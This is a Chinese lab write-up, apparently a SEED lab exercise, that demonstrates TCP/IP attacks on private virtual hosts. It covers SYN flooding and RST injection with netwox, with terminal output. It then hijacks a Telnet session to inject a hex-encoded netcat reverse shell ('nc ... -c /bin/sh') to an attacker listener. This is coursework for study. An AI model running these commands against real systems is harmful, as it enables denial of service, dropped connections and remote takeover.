## TCP-IP攻击
### 概述
1. SYN-Flooding攻击效果,受害者系统卡死.
2. TCP-RST攻击实现已经建立的TCP连接断开.
3. TCP会话劫持,劫持TCP会话,并实现反向Shell.
### 实验环境
1. 三台Linux系统主机,一台作为攻击者,一台作为受害者,一台作为观察者.
2. 为了简化TCP序列号和源端口号的“猜测”,实验处于同一局域网内,你可以使用嗅探器来获取受害者信息.
### SYN-Flooding攻击
1. SYN-Flooding攻击原理
SYN-Flooding是DoS攻击的一种，攻击者向受害者的TCP端口发送很多SYN请求，但攻击者无意完成三次握手过程.  
攻击者要么使用欺骗性的假的IP地址，要么不要继续完成整个三次握手过程.  
通过这种攻击，攻击者可以淹没用于半连接的受害者队列，即已完成SYN，SYN-ACK但尚未得到最终ACK的连接.  
当这个队列已满时，受害者不能再进行任何连接.  

正常三次握手过程:  
```
client  ---  service
SYN     -->
        <--  SYN-ACK
ACK     ---> 
```
在Linux中，我们可以使用以下命令检查  
命令：`＃sysctl -q net.ipv4.tcp_max_syn_backlog`  
```
root@gt:/home/git/Keep-learning/mySeedLab# sysctl -q net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 512
```
我们可以使用命令“netstat -na”来检查队列的使用情况，即与监听端口相关联的半连接的数量.  
这种半连接的状态是SYN-RECV。如果三次握手完成，则连接的状态将为ESTABLISHED.  

在这个任务中，你需要演示SYN-Flooding攻击:  
您可以使用Netwox来执行攻击，然后使用嗅探器捕获攻击性数据包.  
在攻击发生时，在受害机器上运行“netstat -na”命令，并将结果与攻击前的结果进行比较.  

2. Netwox 76简介

```
标题：Synflood
用法：netwox 76 -i ip -p port [-s spoofip]
参数：
-i | --dst-ip ip 目标IP地址
-p | --dst-port port 目标端口号
-s | --spoofip spoofip IP欺骗初始化类型
```
3. SYN Cookie防御机制
如果你的攻击看起来不成功，你可以检查是否启用了SYN cookie机制.  
SYN cookie是抵抗SYN-Flooding的防御机制.  
防御原理简介:  
在TCP服务器收到TCP SYN包并返回TCP SYN+ACK包时，不分配一个专门的数据区，  
而是根据这个SYN包计算出一个cookie值.  
在收到TCP ACK包时，TCP服务器在根据那个cookie值检查这个TCP ACK包的合法性.  
如果合法，再分配专门的数据区进行处理未来的TCP连接.  

你可以使用sysctl命令打开/关闭SYN cookie机制：  
```
＃sysctl -a | grep cookie（显示SYN cookie标志）
＃sysctl -w net.ipv4.tcp_syncookies = 0（关闭SYN cookie）
＃sysctl -w net.ipv4.tcp_syncookies = 1（打开SYN cookie）
```

4. 实验结果分析
```
攻击者:192.168.59.1
受害者:192.168.59.144
攻击者终端对受害者进行SYN-Flooding打击:
`# netwox 76 -i 192.168.59.144 -p 80`
```
实验现象:受害者系统出现卡死状态.  
比较`netstat -na`前后状态如下:  
产生大量的TCP半连接,阻塞了队列,导致后续正常TCP连接无法建立!!  
```
[04/17/2018 16:41] seed@ubuntu:~$ diff 1.txt 2.txt 
5a6,261
> tcp        0      0 192.168.59.144:80       253.138.146.184:9358    SYN_RECV   
> tcp        0      0 192.168.59.144:80       246.55.107.172:50273    SYN_RECV   
> tcp        0      0 192.168.59.144:80       196.23.102.181:5583     SYN_RECV   
> tcp        0      0 192.168.59.144:80       242.22.15.17:45979      SYN_RECV   
> tcp        0      0 192.168.59.144:80       246.166.91.206:61644    SYN_RECV   
> tcp        0      0 192.168.59.144:80       249.212.122.218:23424   SYN_RECV   
> tcp        0      0 192.168.59.144:80       251.32.218.10:56419     SYN_RECV   
> tcp        0      0 192.168.59.144:80       248.235.192.194:41439   SYN_RECV   
> tcp        0      0 192.168.59.144:80       241.118.133.147:19187   SYN_RECV   
> tcp        0      0 192.168.59.144:80       242.23.168.166:21253    SYN_RECV   
> tcp        0      0 192.168.59.144:80       247.207.89.108:45839    SYN_RECV  
> ...........................................................................

```

### TCP-RST攻击
1. FTP协议
`# service vsftpd start`
2. TELNET协议
`# /etc/init.d/openbsd-inetd start`
3. SSH协议
`# /etc/init.d/ssh start`
4. Newox 78简介
```
标题：重置每个TCP数据包
用法：netwox 78 [-d device] [-f filter] [-s spoofip]
参数：
-d | --device device名称{Eth0}
-f | --filter filter pcap过滤器
-s | --spoofip spoofip IP欺骗初始化类型{linkbraw}
```
5. 实验结果分析
- FTP
FTP服务器地址:`192.168.59.146/24`  
FTP客户端地址:`192.168.59.144/24`  
攻击者地址:`192.168.59.1/24`  
攻击者终端对受害者进行TCP-RST打击:
`# netwox 78 -d vmnet8`
结果显示:已经建立的TCP连接断开.  
```
[04/17/2018 23:28] seed@ubuntu:~$ ftp 192.168.59.146
Connected to 192.168.59.146.
220 (vsFTPd 3.0.3)
Name (192.168.59.146:seed): gu
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Desktop
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Documents
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Downloads
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Music
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Pictures
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Public
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Templates
drwxr-xr-x    2 1000     1000         4096 Apr 16 16:32 Videos
226 Directory send OK.
ftp>
ftp> ls
421 Service not available, remote server has closed connection
ftp>
```
- Telnet
Telnet服务器地址:`192.168.59.146/24`  
Telnet客户端地址:`192.168.59.144/24`  
攻击者地址:`192.168.59.1/24`  
攻击者终端对受害者进行TCP-RST打击:
`# netwox 78 -d vmnet8`
结果显示:已经建立的TCP连接断开.   
```
[04/17/2018 23:36] seed@ubuntu:~$ telnet 192.168.59.146
Trying 192.168.59.146...
telnet: Unable to connect to remote host: Connection refused
[04/17/2018 23:36] seed@ubuntu:~$ telnet 192.168.59.146
Trying 192.168.59.146...
Connected to 192.168.59.146.
Escape character is '^]'.
Ubuntu 16.04.4 LTS
ubuntu login: gu
Password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic i686)

gu@ubuntu:~$
gu@ubuntu:~$ ls
Desktop    Downloads         Music     Public     Videos
Documents  examples.desktop  Pictures  Templates
gu@ubuntu:~$
gu@ubuntu:~$ Connection closed by foreign host.
[04/18/2018 00:28] seed@ubuntu:~$
```
- SSH
SSH服务器地址:`192.168.59.146/24`  
SSH客户端地址:`192.168.59.144/24`  
攻击者地址:`192.168.59.1/24`  
攻击者终端对受害者进行TCP-RST打击:
`# netwox 78 -d vmnet8`
结果显示:已经建立的TCP连接断开.   
```
[04/18/2018 00:40] seed@ubuntu:~$ ssh gu@192.168.59.146
gu@192.168.59.146's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic i686)

Last login: Wed Apr 18 00:27:06 2018 from 192.168.59.144
gu@ubuntu:~$ ls
Desktop    Downloads         Music     Public     Videos
Documents  examples.desktop  Pictures  Templates
gu@ubuntu:~$ 
gu@ubuntu:~$ 
gu@ubuntu:~$ Write failed: Broken pipe
[04/18/2018 00:41] seed@ubuntu:~$ 
```

### TCP会话劫持
1. 会话劫持简介
TCP会话劫持攻击的目标是通过向该会话中注入恶意内容来劫持两名受害者之间的现有TCP连接（会话）.  
如果这个连接是一个telnet会话,攻击者可以在这个会话中注入恶意命令(例如删除重要文件),导致受害者执行恶意命令.  
2. Wireshark简介
如果您使用Wireshark观察网络流量,当Wireshark显示TCP序列号时,  
默认情况下会显示相对序列号,它等于实际序列号减去初始序列号.  
如果想查看包中的实际序列号,则需要右键单击Wireshark输出的TCP部分,  
然后选择"Protocol Preference". 在弹出窗口中，取消选"Relative Sequence Number"选项.  
3. Netwox 40简介
```
标题: Spoof Ip4Tcp packet
用法: netwox 40 [-l ip] [-m ip] [-o port] [-p port] [-q uint32] [-B]
参数:
 -c|--ip4-tos uint32            IP4 tos {0}
 -e|--ip4-id uint32             IP4 id (rand if unset) {0}
 -f|--ip4-reserved|+f|--no-ip4-reserved IP4 reserved
 -g|--ip4-dontfrag|+g|--no-ip4-dontfrag IP4 dontfrag
 -h|--ip4-morefrag|+h|--no-ip4-morefrag IP4 morefrag
 -i|--ip4-offsetfrag uint32     IP4 offsetfrag {0}
 -j|--ip4-ttl uint32            IP4 ttl {0}
 -k|--ip4-protocol uint32       IP4 protocol {0}
 -l|--ip4-src ip                IP4 src {172.16.27.1}
 -m|--ip4-dst ip                IP4 dst {5.6.7.8}
 -n|--ip4-opt ip4opts           IPv4 options
 -o|--tcp-src port              TCP src {1234}
 -p|--tcp-dst port              TCP dst {80}
 -q|--tcp-seqnum uint32         TCP seqnum (rand if unset) {0}
 -r|--tcp-acknum uint32         TCP acknum {0}
 -s|--tcp-reserved1|+s|--no-tcp-reserved1 TCP reserved1
 -t|--tcp-reserved2|+t|--no-tcp-reserved2 TCP reserved2
 -u|--tcp-reserved3|+u|--no-tcp-reserved3 TCP reserved3
 -v|--tcp-reserved4|+v|--no-tcp-reserved4 TCP reserved4
 -w|--tcp-cwr|+w|--no-tcp-cwr   TCP cwr
 -x|--tcp-ece|+x|--no-tcp-ece   TCP ece
 -y|--tcp-urg|+y|--no-tcp-urg   TCP urg
 -z|--tcp-ack|+z|--no-tcp-ack   TCP ack
 -A|--tcp-psh|+A|--no-tcp-psh   TCP psh
 -B|--tcp-rst|+B|--no-tcp-rst   TCP rst
 -C|--tcp-syn|+C|--no-tcp-syn   TCP syn
 -D|--tcp-fin|+D|--no-tcp-fin   TCP fin
 -E|--tcp-window uint32         TCP window {0}
 -F|--tcp-urgptr uint32         TCP urgptr {0}
 -G|--tcp-opt tcpopts           TCP options
 -H|--tcp-data mixed_data       mixed data

```
4. 实验结果分析
Telnet服务器地址:`192.168.59.146/24`  
Telnet客户端地址:`192.168.59.144/24`  
攻击者地址:`192.168.59.1/24`  
攻击者终端对受害者进行TCP会话劫持:  

我们要伪造发下一个包:  
所以直接采用nextseq作为下一个包的ack,采用ack作为下一个包的seq.  
最后一个Telnet数据包内容如下:  
![最后一个Telnet数据包内容!!!](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/1.png)

我们伪造向服务器`192.168.59.148`发送`ls `命令,  
将`ls`转换成16进制并加上`\r`的16进制数得到`6c730d00`,  
通过netwox构造我们的攻击指令如下:  
`netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.59.146 --ip4-dst 192.168.59.148 --tcp-src 46088 --tcp-dst 23 --tcp-seqnum 1362571669 --tcp-acknum 644316190 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data "6c730d00"`

在wireshark上显示抓包数据如下:

![我们成功的发送了ls !!!](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/1.png)

![我们成功的获取到了服务器发送的数据 !!!](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/1.png)


现在我们来通过NC反弹一个Shell,来控制我们受害者:  
首先是构造NC命令:
攻击者:`nc -lp 10010 -vvv`
受害者:`nc 192.168.59.1 10010 -c /bin/sh`
`netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.59.146 --ip4-dst 192.168.59.148 --tcp-src 46098 --tcp-dst 23 --tcp-seqnum 1600031421 --tcp-acknum 830921755 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data "6e63203139322e3136382e35392e31203130303130202d63202f62696e2f73680d00"`  

实验结果如图:
![反弹Shell成功](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/1.png)





